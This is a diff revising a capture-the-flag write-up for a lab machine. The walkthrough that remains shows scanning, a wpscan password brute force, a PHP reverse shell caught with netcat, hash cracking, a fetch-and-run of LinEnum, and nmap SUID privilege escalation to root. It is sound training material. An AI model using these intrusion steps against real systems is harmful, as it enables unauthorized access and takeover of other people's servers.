@@ -23,26 +23,12 @@ vulnerabilities in the system.
 - Crack the MD5 via `hashcat` and to spawn a shell with `python` to login as `robot` to capture `key-2-of-3.txt`
 - Find possible vulnerabilities in the shell via `LinEnum` to escalate privileges to `root` and capture`key-3-of-3.txt`
  
-## Tools Used
-- `nmap`
-- `gobuster`
-- `wpscan`
-- `php-reverse-shell`
-- `nc`
-- `hashcat`
-- `python`
-- `LinEnum`
-
 ## Walkthrough
 ### nmap
 We first begin with a pretty basic and standard `nmap` scan to see the services and what we're dealing with.
 
 ```
 $ nmap -sC -sV 192.168.2.243
-
-[...]
-
-Not shown: 997 filtered ports
 PORT    STATE  SERVICE  VERSION
 22/tcp  closed ssh
 80/tcp  open   http     Apache httpd
@@ -55,8 +41,6 @@ PORT    STATE  SERVICE  VERSION
 | Not valid before: 2015-09-16T10:45:03
 |_Not valid after:  2025-09-13T10:45:03
 MAC Address: 18:D6:C7:B8:FD:A1 (Tp-link Technologies)
-
-[...]
 ```
 
 We have `HTTP` on Port 80 and a closed `SSH` on Port 22.
@@ -72,7 +56,6 @@ must scan for hidden directories with `gobuster`. Do note that `directory-list-2
 
 ```
 $ gobuster dir -u 192.168.2.243 -w directory-list-2.3-medium.txt
-  
 =====================================================
 Gobuster v2.0.1              OJ Reeves (@TheColonial)
 =====================================================
@@ -151,20 +134,6 @@ login as `elliot`. Since we were given `fsocity.dic` earlier, it would make sens
 
 ```
 $ wpscan --url 192.168.2.243 --passwords fsocity.dic --usernames elliot
-_______________________________________________________________
-        __          _______   _____
-        \ \        / /  __ \ / ____|
-         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-           \  /\  /  | |     ____) | (__| (_| | | | |
-            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-
-        WordPress Security Scanner by the WPScan Team
-                       Version 3.5.4
-          Sponsored by Sucuri - https://sucuri.net
-      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
-_______________________________________________________________
-
 [+] URL: http://192.168.2.243/
 
 Interesting Finding(s):
@@ -236,17 +205,9 @@ webpages of our choosing. Pasting the script to `404 Template` will suffice as t
 $ curl http://192.168.2.243/404.php
 
 $ nc -v -n -l -p 7500
-
-listening on [any] 7500 ...
-connect to [192.168.2.112] from (UNKNOWN) [192.168.2.243] 50652
-Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
-19:30:11 up  4:26,  0 users,  load average: 0.00, 0.02, 0.05
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 /bin/sh: 0: can't access tty; job control turned off
-
-$ pwd
-/
 
 $ cd /home
 
@@ -283,22 +244,11 @@ commence a dictionary attack to crack it. Do note that `rockyou.txt` was copied 
 
 ```
 $ hashcat -m 0 -a 0 -d 1 --force hash.txt rockyou.txt
-
-[...]
-
 c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
-                                                 
-[...]
 ```
 
-Now let's attempt to switch users in the shell with our password
-
-```
-$ su robot
-su: must be run from a terminal
-```
-
-We need to spawn a proper shell if we want to switch users. To do that we'll use `python`.
+Now let's attempt to switch users in the shell with our password. But in order to do that we need to spawn a proper 
+shell with `python`.
 
 ```
 $ python -c 'import pty; pty.spawn("/bin/sh")'
@@ -312,8 +262,6 @@ cat key-2-of-3.txt
 822c73956184f694993bede3eb39f959
 ```
 
-After spawning `/bin/sh` using `pty` from `python`, we can read `key-2-of-3.txt` and capture our second key.
-
 ### Logging in as Root
 To capture our final flag we'll have to login as `root`. Since we have no clues regarding what the password for it 
 might be, we must attempt privilege escalation. Using [LinEnum][LinEnum], we can scan for possible vulnerabilities in 
@@ -321,13 +269,15 @@ the system.
 
 ```
 $ cd /tmp
-cd /tmp
 
 $ wget raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 
 $ chmod +x LinEnum.sh
 
 $ ./LinEnum.sh
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
 
 [...]
 
@@ -346,32 +296,23 @@ $ ./LinEnum.sh
 -rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
 
 [...]
-
-
 ```
 
-`LinEnum` revealed a `SUID` regarding `nmap`. Checking its version; `3.81`, is a version that is known to be 
-vulnerable to a certain privilege escalation attacking using `--interactive`.
+`LinEnum` revealed an interesting `SUID` regarding `nmap`. Checking its version; `3.81`, is a version that is known to 
+be vulnerable to a certain privilege escalation attacking using `--interactive`.
 
 ```
 $ nmap --interactive
-nmap --interactive
-
-
-Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
 Welcome to Interactive Mode -- press h <enter> for help
 nmap> !sh
 !sh
 
 # whoami
-whoami
 root
 
 # cd /root
-cd /root
 
 # ls -la
-ls -la
 total 32
 drwx------  3 root root 4096 Nov 13  2015 .
 drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
@@ -384,7 +325,6 @@ drwx------  2 root root 4096 Nov 13  2015 .cache
 -rw-------  1 root root 1024 Sep 16  2015 .rnd
 
 # cat key-3-of-3.txt
-cat key-3-of-3.txt
 04787ddef27c3dee1ee161b21670b4e4
 ```
 
